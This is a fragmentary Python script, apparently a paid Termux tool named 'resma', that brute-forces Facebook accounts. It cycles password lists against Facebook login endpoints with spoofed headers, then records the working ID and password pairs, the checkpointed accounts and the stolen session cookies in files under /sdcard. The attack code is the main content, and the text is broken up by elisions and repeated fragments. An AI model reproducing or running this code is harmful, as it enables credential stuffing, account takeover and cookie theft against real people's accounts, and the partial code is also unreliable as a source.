...
　\33[1;35m　　　　∠_,,,/
 MR.VEAR
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mresma\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:ibrahim
...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mﾒ٠ibrahim\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/resma.txt \033[0;97m\n')
        #100010138361148
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mresma\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'x-fb-request-id': 'AxZktQ5FjoYkid2XAJZIg2P',
    'x-fb-trace-id': 'D9/nh/hPmfw',
    'x-fb-rev': '1008129242',
    'x-fb-debug': 'vVEqVFTZoeJBdCWd7mDhmroha0sLF8JuH61MnGjjLG0vbjL6onko50CtAGqvM+eMtLoHNiY17xna9lFQxtNgKg==',
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [resma-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/resma-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/resma-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [resma-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/resma-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [resma] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [resma-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/resma-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/resmaCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [resma-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/resma-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/resma_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [resma-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/resma-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/Ibrahim-resma/Resma/blob/main/Approved.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32m ibrahim Tool Paid You Need Get Approved First\033[1;37m\n")
		print ("")
